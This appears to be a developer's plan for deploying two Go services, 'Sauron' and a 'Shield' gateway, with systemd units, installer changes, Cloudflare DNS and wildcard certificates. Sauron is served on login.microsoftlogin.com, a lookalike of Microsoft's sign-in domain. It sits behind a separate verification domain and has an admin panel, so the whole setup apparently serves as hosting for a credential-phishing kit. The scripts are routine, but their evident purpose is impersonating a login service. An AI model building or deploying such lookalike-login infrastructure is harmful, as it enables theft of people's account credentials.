# 🛡️ Shield Domain Integration Plan

## Overview

Shield domain will be integrated into the **same deployment** as Sauron, running as a **separate systemd service** on the same VPS.

---

## Deployment Architecture

### **Single VPS, Two Services:**

```
VPS (Your Server)
├── Sauron Service (Port 443, 80)
│   ├── Binary: /usr/local/bin/sauron
│   ├── Working Dir: /path/to/installation/
│   ├── Domain: login.microsoftlogin.com
│   └── Service: sauron.service
│
└── Shield Service (Port 8080)
    ├── Binary: /usr/local/bin/shield
    ├── Working Dir: /path/to/installation/shield-domain/
    ├── Domain: secure.auth-portal.com
    └── Service: shield.service
```

---

## Installation Flow

### **Current Sauron Installation:**

```bash
./install-production.sh
    ↓
1. Detect installation path: $(pwd)
2. Build/copy Sauron binary to /usr/local/bin/sauron
3. Create sauron.service with sed replacement:
   sed "s|__INSTALL_PATH__|$INSTALL_PATH|g" sauron.service > /etc/systemd/system/sauron.service
4. systemctl enable sauron.service
5. systemctl start sauron.service
```

### **New Installation (with Shield):**

```bash
./install-production.sh
    ↓
1. Detect installation path: $(pwd)
    
2. Install Sauron:
   - Build/copy Sauron binary to /usr/local/bin/sauron
   - Create sauron.service → /etc/systemd/system/sauron.service
   - systemctl enable sauron.service
   
3. Install Shield:
   - Build shield binary from shield-domain/
   - Copy to /usr/local/bin/shield
   - Create shield.service → /etc/systemd/system/shield.service
   - systemctl enable shield.service
   
4. Configure DNS for both domains
5. Generate SSL for both domains
6. Start both services:
   - systemctl start sauron.service
   - systemctl start shield.service
```

---

## Configuration

### **Single `.env` File (at root):**

```bash
# Sauron Configuration
SAURON_DOMAIN=microsoftlogin.com

# Shield Configuration
SHIELD_DOMAIN=auth-portal.com
SHIELD_PORT=8080

# Shared Configuration
CLOUDFLARE_API_TOKEN=your_token_here
TURNSTILE_SECRET=your_secret_here
ADMIN_KEY=your_admin_key_here
```

### **shield.service Template:**

```ini
[Unit]
Description=Shield Domain Gateway
After=network.target sauron.service
Requires=sauron.service

[Service]
Type=simple
User=root
Group=root
ExecStart=/usr/local/bin/shield
WorkingDirectory=__INSTALL_PATH__/shield-domain
Restart=on-failure
RestartSec=10
StartLimitInterval=60
StartLimitBurst=3
EnvironmentFile=__INSTALL_PATH__/.env
Environment=DEV_MODE=false
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

**Key Points:**

- `After=sauron.service` - Shield starts AFTER Sauron
- `Requires=sauron.service` - Shield needs Sauron to be running
- `WorkingDirectory=__INSTALL_PATH__/shield-domain` - Shield's own directory
- `EnvironmentFile=__INSTALL_PATH__/.env` - Shares same .env as Sauron

---

## Certificate Management

### **Development (mkcert):**

```
Installation Root/
├── tls/                          # Sauron certificates
│   ├── cert.pem                  # *.microsoftlogin.com
│   └── key.pem
│
└── shield-domain/
    └── tls/                      # Shield certificates
        ├── cert.pem              # *.auth-portal.com
        └── key.pem
```

**Generation:**

```bash
# Sauron certs (existing)
mkcert -cert-file tls/cert.pem -key-file tls/key.pem *.microsoftlogin.com

# Shield certs (new)
cd shield-domain
mkcert -cert-file tls/cert.pem -key-file tls/key.pem *.auth-portal.com
```

### **Production (CertMagic):**

```
~/.local/share/certmagic/certificates/acme-v02.api.letsencrypt.org-directory/
├── wildcard_.microsoftlogin.com/     # Sauron cert
│   ├── wildcard_.microsoftlogin.com.crt
│   └── wildcard_.microsoftlogin.com.key
│
└── wildcard_.auth-portal.com/        # Shield cert
    ├── wildcard_.auth-portal.com.crt
    └── wildcard_.auth-portal.com.key
```

**Both copied to local directories:**

```
Installation Root/
├── tls/                          # Sauron certificates (copied)
│   ├── cert.pem
│   └── key.pem
│
└── shield-domain/
    └── tls/                      # Shield certificates (copied)
        ├── cert.pem
        └── key.pem
```

---

## Communication

### **Shield → Sauron (Internal WebSocket):**

```
Shield Domain (Port 8080)
    ↓
WebSocket: ws://localhost:8443/shield-ws
    ↓
Sauron Server (Port 443)
```

**Benefits:**

- ✅ Internal communication (localhost)
- ✅ No external exposure
- ✅ Fast and secure
- ✅ No firewall configuration needed

---

## DNS Configuration

### **Both Domains Configured:**

```
Cloudflare DNS:

microsoftlogin.com (Sauron):
├── *.microsoftlogin.com → VPS_IP
└── A record subdomains as needed

auth-portal.com (Shield):
├── *.auth-portal.com → VPS_IP  
└── A record subdomains as needed
```

**Installation script handles:**

- Detects both domains from `.env`
- Configures DNS for both
- Generates SSL for both

---

## Build Process

### **Current (Sauron only):**

```bash
go build -o sauron main.go
```

### **New (Both):**

```bash
# Build Sauron
go build -o sauron main.go

# Build Shield
cd shield-domain
go build -o shield main.go
cd ..

# Both binaries ready for installation
```

---

## Service Management

### **Starting Services:**

```bash
# Start Sauron first
systemctl start sauron.service

# Then start Shield (depends on Sauron)
systemctl start shield.service

# Or start both
systemctl start sauron.service shield.service
```

### **Checking Status:**

```bash
# Both services
systemctl status sauron.service shield.service

# Individual
systemctl status sauron.service
systemctl status shield.service
```

### **Logs:**

```bash
# Sauron logs
journalctl -u sauron.service -f

# Shield logs
journalctl -u shield.service -f

# Both together
journalctl -u sauron.service -u shield.service -f
```

---

## Directory Structure

```
Installation Root (e.g., /root/sauron)/
├── main.go                       # Sauron main
├── .env                          # Shared configuration
├── tls/                          # Sauron certificates
│   ├── cert.pem
│   └── key.pem
├── install/
│   ├── sauron.service           # Sauron service template
│   ├── shield.service           # Shield service template (NEW)
│   └── install-production.sh    # Updated installer
├── shield-domain/                # Shield domain code (NEW)
│   ├── main.go                  # Shield main
│   ├── go.mod                   # Shield dependencies
│   ├── config/
│   ├── handlers/
│   ├── templates/
│   └── tls/                     # Shield certificates
│       ├── cert.pem
│       └── key.pem
└── scripts/
    └── configure-env.sh         # Updated to include SHIELD_DOMAIN
```

---

## Installation Script Updates

### **Modified `install-production.sh`:**

```bash
# After installing Sauron binary...

# ───────────── Install Shield Binary ─────────────
echo ""
echo "🛡️ Installing Shield Domain..."

cd shield-domain

# Build shield binary
go build -o shield main.go
if [ $? -ne 0 ]; then
    echo "   ❌ Shield build failed"
    exit 1
fi

# Copy to system location
cp shield /usr/local/bin/shield
chmod +x /usr/local/bin/shield

cd ..

# Create shield service file
sed "s|__INSTALL_PATH__|$INSTALL_PATH|g" install/shield.service > /etc/systemd/system/shield.service

systemctl daemon-reload
systemctl enable shield.service

echo "   ✅ Shield binary installed and service configured"

# ───────────── Configure DNS for Both Domains ─────────────
echo ""
echo "🌐 Configuring DNS for both domains..."

# Configure Sauron domain (existing logic)
# ... existing code ...

# Configure Shield domain (new logic)
SHIELD_DOMAIN=$(grep "^SHIELD_DOMAIN=" .env | cut -d'=' -f2)
if [ -n "$SHIELD_DOMAIN" ]; then
    echo "   Configuring shield domain: $SHIELD_DOMAIN"
    # Add DNS configuration logic
fi

# ───────────── Start Services ─────────────
echo ""
echo "🚀 Starting services..."

# Start Sauron first
systemctl start sauron.service
sleep 3

# Then start Shield
systemctl start shield.service
sleep 2

echo "   ✅ Sauron service: $(systemctl is-active sauron.service)"
echo "   ✅ Shield service: $(systemctl is-active shield.service)"
```

---

## Configuration Script Updates

### **Modified `scripts/configure-env.sh`:**

Add shield domain configuration:

```bash
# After SAURON_DOMAIN configuration...

# ───────────── Shield Domain Configuration ─────────────
echo ""
echo "🛡️ Shield Domain Configuration"
echo ""

if [ -z "$SHIELD_DOMAIN" ]; then
    read -p "Enter your shield domain (e.g., auth-portal.com): " SHIELD_DOMAIN
    if [ -z "$SHIELD_DOMAIN" ]; then
        echo "❌ Shield domain is required"
        exit 1
    fi
fi

echo "SHIELD_DOMAIN=$SHIELD_DOMAIN" >> .env
echo "   ✅ Shield domain configured: $SHIELD_DOMAIN"
```

---

## Summary

### **What's Integrated:**

✅ Single deployment installs both services
✅ Same VPS, different systemd services
✅ Shared `.env` configuration
✅ Both domains configured automatically
✅ Both SSL certificates generated automatically
✅ Both services start together
✅ Internal WebSocket communication
✅ Path-agnostic installation (like Sauron)

### **Benefits:**

- Easy deployment (one command)
- Unified configuration
- Automatic service dependencies
- Shared logging infrastructure
- Simple management (systemctl)
- No extra VPS needed

### **Next Steps:**

1. Create shield.service template
2. Create shield TLS certificate generation
3. Build shield main.go
4. Integrate into install-production.sh
5. Update configure-env.sh
6. Test deployment

---

## Testing

### **Development:**

```bash
# Terminal 1: Run Sauron
go run main.go

# Terminal 2: Run Shield
cd shield-domain && go run main.go

# Both running on localhost
```

### **Production:**

```bash
sudo ./install-production.sh

# Check both services
systemctl status sauron.service shield.service

# Test both domains
curl https://login.microsoftlogin.com/admin
curl https://secure.auth-portal.com/verify/test123
```
